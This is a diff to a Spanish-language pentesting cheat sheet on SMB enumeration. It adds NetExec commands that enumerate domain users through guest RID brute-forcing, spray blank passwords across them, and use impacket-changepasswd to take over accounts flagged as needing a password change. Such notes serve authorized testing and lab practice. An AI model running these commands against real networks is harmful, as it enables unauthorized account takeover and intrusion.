@@ -84,11 +84,14 @@ Tags: #SMB #RPC #PsExec #Windows #Enum #Credentials #LateralMovement
 # Mapear toda la red buscando hosts sin SMB signing (clave para relay attacks)
 
 ❯ nxc smb <IP> -u 'guest' -p '' --rid-brute | grep "SidTypeUser"
+❯ nxc smb <IP> -u 'guest' -p '' --rid-brute | grep "SidTypeUser" | awk -F'\\' '{print $2}' | awk '{print $1}' > users.txt
 # Enum usuarios válidos por RID → no requiere creds
 
-❯ impacket-changepassws domain.local/user:'Passwd'@IP -newpass 'P@$$w0rd123!'
+❯ nxc smb <IP> -u users.txt -p '' --continue-on-success 
 # Si al buscar usuarios le podemos asignar una password si estos salen con el siguiente mensaje:
-	[] 
+	[-] domain.local\Elliot.Yates: STATUS_PASSWORD_MUST_CHANGE 
+❯ impacket-changepasswd domain.local/user:'Passwd'@IP -newpass 'P@$$w0rd123!'
+# Cambiar la password 
 
 ❯ nmblookup -A <IP>
 # No requiere creds → obtiene NetBIOS (hostname + posible dominio)
